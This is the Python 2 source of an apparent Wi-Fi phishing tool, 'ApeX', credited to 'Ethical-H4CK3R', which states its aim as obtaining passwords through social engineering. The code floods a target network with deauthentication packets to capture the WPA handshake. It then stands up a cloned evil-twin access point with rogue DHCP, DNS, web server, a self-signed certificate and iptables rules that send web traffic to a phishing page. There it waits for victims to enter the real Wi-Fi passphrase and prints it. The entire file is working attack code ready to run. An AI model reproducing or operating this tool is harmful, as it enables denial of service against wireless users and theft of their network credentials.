# Date: 07/04/2017
# Distro: Kali linux
# Author: Ethical-H4CK3R
# Description: Obtain password using social engineering

import os
import csv
import time
import shutil
import socket
import argparse
import threading
import subprocess
from core.config import *
from core.dns import Dns as DnsServer
from core.webpage import Webpage as SiteHandler
from core.deauth import Deauthenticate as Deauth
from core.eviltwin import MonitorEviltwin as Eviltwin
from core.interface import Interface as InterfaceManager
from core.accesspoints import Accesspoints as NetworkManager

__version__ = 1.0

class Aircrack(Deauth,Eviltwin,DnsServer,SiteHandler,NetworkManager,InterfaceManager):
 def __init__(self,iface,bssid=None):
  Deauth.__init__(self)
  Eviltwin.__init__(self)
  DnsServer.__init__(self)
  SiteHandler.__init__(self)
  NetworkManager.__init__(self)
  InterfaceManager.__init__(self,iface) if not bssid else InterfaceManager.__init__(self,iface,bssid)
  self.iface = iface

  self.out = '.data-01.out'
  self.csv = 'data-01.csv'
  self.cap = 'data-01.cap'

  self.ap = None
  self.atk = False
  self.alive = True
  self._exit = False
  self.bssid = None
  self.essid = None
  self.loadAp = True
  self.channel = None
  self.handshake = None
  self.monitorNetwork = False

 def _killProc(self):
  cmd = "for task in `lsof -i  | grep -v 'COMMAND' | grep -v 'firefox-e' | awk '{print $2}'`; do kill -9 $task;done"
  subprocess.Popen(cmd,stdout=devnull,stderr=devnull,shell=True).wait()

 def killProc(self):
  for proc in ['airodump-ng','aireplay-ng','aircrack-ng','hostapd','lighttpd','php-cgi','dhcpd','apache2','wpa_supplicant']:
   subprocess.Popen('pkill {}'.format(proc),stdout=devnull,stderr=devnull,shell=True).wait()

 def kill(self,killall=False):
  self.killProc()
  if killall:self._killProc()

 def remove(self):
  for f in os.listdir('.'):
   if any([f.startswith('data'),f.startswith('.data')]):
    os.remove(f)

 def exitMsg(self):
  while not self._exit:
   for n in range(4):
    subprocess.call(['clear'])
    print 'Exiting {}'.format(n*'.')
    time.sleep(.4)

 def exit(self,display=True):
  try:
   self.alive = False
   try:
    shutil.rmtree(ApeX)
   except OSError:pass
   self.destroyInterface()
   self.kill()
   if display:
    threading.Thread(target=self.exitMsg).start()
   if self.udp:
    self.udp.close()
   self.managedMode()
   if display:
    time.sleep(5)
  finally:
   self._exit = True
   exit()

 def loading(self,ssid=None,load=False):
  if load:
   self.ap.aps = False
   self.handshake = False
  else:
   self.ap = NetworkManager(ssid)
  while all([not self.handshake,not self.ap.aps,self.alive,self.loadAp]):
   for n in range(4):
    time.sleep(.4)
    if self.ap.aps:break
    if not self.alive:break
    if self.handshake:break
    if not self.loadAp:break
    subprocess.call(['clear'])
    if load:
     print 'Creating Eviltwin Accesspoint {}'.format(n*'.')
    elif not ssid:
     print 'Scanning {}'.format(n*'.')
    else:
     print 'Searching for: {} {}'.format(ssid,n*'.')

 def display(self):
  if os.path.exists(self.csv):
   time.sleep(.1)
   self.ap.open(self.csv)

 def scan(self):
  cmd = ['airodump-ng','-a','-w','data','--output-format','csv',self.iface]
  subprocess.Popen(cmd,stdout=devnull,stderr=devnull)

 def startScan(self):
  threading.Thread(target=self.loading).start()
  self.monitorMode()
  self.kill(True)
  self.remove()
  self.scan()

 def grabChannel(self):
  if os.path.exists(self.csv):
   with open(self.csv,'r') as csvfile:
    csvfile = csv.reader(csvfile,delimiter=',')
    lines = [line for line in csvfile]
    num = [num for num,line in enumerate(lines) if len(line)==15 if line[0]==self.bssid]
    return lines[num[0]][3] if num else None

 def updateInfo(self):
  try:
   ap = self.ap.aps[self.bssid]
  except KeyError:return
  self.kill()
  self.remove()
  threading.Thread(target=self.loading,args=[self.essid]).start()
  cmd = ['airodump-ng','-w','data','--output-format','csv','-a',self.iface]
  subprocess.Popen(cmd,stdout=devnull,stderr=devnull)
  while self.alive:
   chann = self.grabChannel()
   if chann:
    essid = ap['essid']
    self.channel = chann.strip()
    self.essid = essid if all([essid != 'HIDDEN',essid != 'UNKNOWN']) else self.essid
    break

 def attack(self):
  cmd = ['aireplay-ng','-0',str(1),'-a',self.bssid,'--ignore-negative-one',self.iface]
  subprocess.Popen(cmd,stdout=devnull,stderr=devnull).wait()
  time.sleep(1.3)

 def readCap(self):
  if os.path.exists(self.cap):
   log = open(self.out,'w')
   cmd = ['aircrack-ng',self.cap]
   subprocess.Popen(cmd,stdout=log,stderr=log).wait()
   log.close()

 def readLog(self):
  if not os.path.exists(self.out):return
  with open(self.out) as aircrackOutput:
   try:
    line = [line for line in aircrackOutput if '(1' in line.split()]
   except IndexError:return
   try:
    if line:
     if self.essid == self.bssid:
      try:
       essid = self.ap.aps[self.bssid]['essid']
       if any([essid != self.bssid,essid != 'HIDDEN',essid != 'UNKNOWN']):
        self.essid = essid
       else:return
      except KeyError:return
     if all([self.essid != 'HIDDEN',self.essid != 'UNKNOWN']):
      self.handshake = True
      self.postHandshake()
   except NameError:return

 def listen(self):
  try:
   ap = self.ap.aps[self.bssid]
  except KeyError:return
  if ap['client']:
   self.atk = True
   self.attack()
   # time.sleep(3.5)
   if not self.handshake:
    self.readCap()
    self.readLog()
    self.atk = False

 def postHandshake(self):
  shutil.copyfile(self.cap,'handshake.cap')
  self.cap = 'handshake.cap'
  self.remove()
  self.kill()

 def preHandshake(self):
  while all([not self.handshake,self.alive,self.monitorNetwork]):
   self.display()
   if all([not self.atk,self.ap.aps]):
    threading.Thread(target=self.listen).start()
   time.sleep(1.7)

 def scanTarget(self):
  self.kill()
  self.remove()
  cmd = ['airodump-ng','-a','--bssid',self.bssid,'-c',self.channel,'-w','data','--output-format','cap,csv',self.iface]
  subprocess.Popen(cmd,stdout=devnull,stderr=devnull)
  time.sleep(1.5)

class Apex(Aircrack):
 def __init__(self,iface,bssid,_bssid,essid,channel):
  super(Apex,self).__init__(iface,bssid)
  self.bssid = bssid # eviltwin ap
  self.essid = essid
  self._iface = 'mon0' # deauth interface
  self._bssid = _bssid # target ap
  self.channel = channel

 def disconnect(self):
  time.sleep(5)
  self.configAttack()
  self.createInterface()
  while all([not self.passphrase,self.alive]):
   try:map(self.sendPkts,range(256))
   except:pass

 def configAp(self):
  Hostapd(self.channel,self.essid,self.iface).write()
  Lighttpd().write()
  Dhcpd().write()

 def route(self):
  subprocess.Popen('ifconfig {} 192.168.0.1 netmask 255.255.255.0'.format(self.iface),stdout=devnull,stderr=devnull,shell=True).wait()
  subprocess.Popen('route add -net 192.168.0.0 netmask 255.255.255.0 gw 192.168.0.1',stdout=devnull,stderr=devnull,shell=True).wait()
  subprocess.Popen('sysctl -w net.ipv4.ip_forward=1',stdout=devnull,shell=True).wait()

 def startAp(self):
  output = open(self.hostapdOutput,'w')
  subprocess.Popen('hostapd hostapd.conf',stdout=output,shell=True)
  time.sleep(5)

 def iptables(self):
  cmds = ['iptables --flush','iptables --table nat --flush','iptables --delete-chain','iptables -P FORWARD ACCEPT',
          'iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.0.1:80',
          'iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination 192.168.0.1:443',
          'iptables -A INPUT -p tcp --sport 443 -j ACCEPT','iptables -A OUTPUT -p tcp --dport 443 -j ACCEPT',
          'iptables -t nat -A POSTROUTING -j MASQUERADE']
  for cmd in cmds:
   subprocess.Popen(cmd,stdout=devnull,shell=True).wait()

 def dnsServer(self):
  self.udp = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
  self.udp.bind(('',53))
  while all([not self.passphrase,self.alive]):
   try:self.runDns()
   except:pass

 def authen(self):
  self.setConfig()
  while all([not self.passphrase,self.alive]):
   self.runServer()

 def dhcpd(self):
  cmd = 'dhcpd -d -f -lf dhcpd.leases -cf dhcpd.conf'
  subprocess.Popen(cmd,stdout=devnull,stderr=devnull,shell=True)

 def lighttpd(self):
  subprocess.Popen('lighttpd -f lighttpd.conf',stdout=devnull,stderr=devnull,shell=True).wait()
  time.sleep(1.5)

 def ssl(self):
  cmd = "openssl req -new -x509 -keyout cert.pem -out cert.pem -days 365 -nodes -newkey rsa:2048 -subj '/C=RU'"
  subprocess.Popen(cmd,stdout=devnull,stderr=devnull,shell=True).wait()
  subprocess.Popen('chmod 400 cert.pem',stdout=devnull,stderr=devnull,shell=True).wait()

 def displayEviltwin(self):
  clients = self.eviltwinInfo()
  channel = '{} '.format(self.channel) if len(self.channel) == 1 else self.channel
  subprocess.call(['clear'])
  if clients:
   for n in clients:
    print n
  else:
   print '                  +------------------------+'
   print '                  || Eviltwin Accesspoint ||'
   print '----------------------------------------------------------------'
   print '|| num  || \t  Bssid\t       || Channel ||  Client || Essid ||'
   print '----------------------------------------------------------------'
   print '----------------------------------------------------------------'
   print '|| 0    ||  {}  ||    {}   ||\t-    || {} '.format(self.bssid.upper(),channel,self.essid)
   print '+--------------------------------------------------------------+'

def main():
 # assign arugments
 args = argparse.ArgumentParser()
 args.add_argument('interface',help='wireless interface')
 args = args.parse_args()

 # assign variables
 iface = args.interface
 engine = Aircrack(iface)
 apexDir = ApeX

 # remove directory
 if os.path.exists(apexDir):
  shutil.rmtree(apexDir)

 # create directory
 os.mkdir(apexDir)

 # change directory
 os.chdir(apexDir)

 # clear the screen
 subprocess.call(['clear'])

 # start scanning
 try:
  engine.startScan()
 except KeyboardInterrupt:
  engine.exit()

 # display
 while 1:
  try:
   cache = engine.display()
  except KeyboardInterrupt:
   engine.kill() if engine.ap.aps.keys() else engine.exit()
   break

 # user input
 try:
  cache
  engine.bssid = engine.ap.mem[eval(raw_input('\nEnter a num: '))]
  engine.essid = engine.ap.aps[engine.bssid]['essid']
  engine.essid = engine.essid if all([engine.essid != 'HIDDEN',engine.essid != 'UNKNOWN']) else engine.bssid
  engine.channel = engine.ap.aps[engine.bssid]['chann']
 except:
  engine.exit()

 # display scanning [target] ...
 threading.Thread(target=engine.loading,args=[engine.essid]).start()

 # listen for handshake
 while all([not engine.handshake,engine.alive]):
  try:
   engine.scanTarget()
   engine.monitorNetwork = True
   threading.Thread(target=engine.preHandshake).start()
   # wait for 60 second before obtaining info
   for t in range(60):
    time.sleep(1)
    if engine.handshake:
     break
   engine.monitorNetwork = False
   if engine.atk: # attacking the target ap
    while engine.atk:pass # wait for the attack to finish
    time.sleep(3.5) # wait for handshake
   if not engine.handshake:# check if a handshake is captured
    engine.updateInfo()
  except KeyboardInterrupt:
   engine.exit()

 # run eviltwin accesspoint
 try:
  # set phishing variable
  apex = Apex(engine.iface,engine.macAddress,engine.bssid,engine.essid,engine.channel)

  # creating eviltwin accesspoint ...
  threading.Thread(target=engine.loading,kwargs={'load':True}).start()

  # copy site --> /tmp/ApeX/
  shutil.copytree('{}/site'.format(HQ),'{}site/'.format(apexDir))

  # configure ap
  apex.configAp()

  # set gateway
  apex.route()

  # generate ssl cert
  apex.ssl()

  # config iptables
  apex.iptables()

  # start ap
  apex.startAp()

  # start dhcpd
  apex.dhcpd()

  # start webserver
  apex.lighttpd()

  # start dns server
  threading.Thread(target=apex.dnsServer).start()

  # start password validator
  threading.Thread(target=apex.authen).start()

  # stop loading
  engine.loadAp = False

  # start deauthentication attack
  threading.Thread(target=apex.disconnect).start()

  # wait for password
  while all([not apex.passphrase,apex.alive]):
   apex.displayEviltwin()
   time.sleep(3)
 finally:
  engine.loadAp = False
  if apex.passphrase:
   time.sleep(10)
   subprocess.call(['clear'])
   print 'Password Found: {}'.format(apex.passphrase[0])
   apex.exit(False)
  else:
   apex.exit()

if __name__ == '__main__':
 HQ = os.getcwd()
 ApeX = '/tmp/ApeX/'
 devnull = open(os.devnull,'w')
 exit('root access required') if os.getuid() else main()
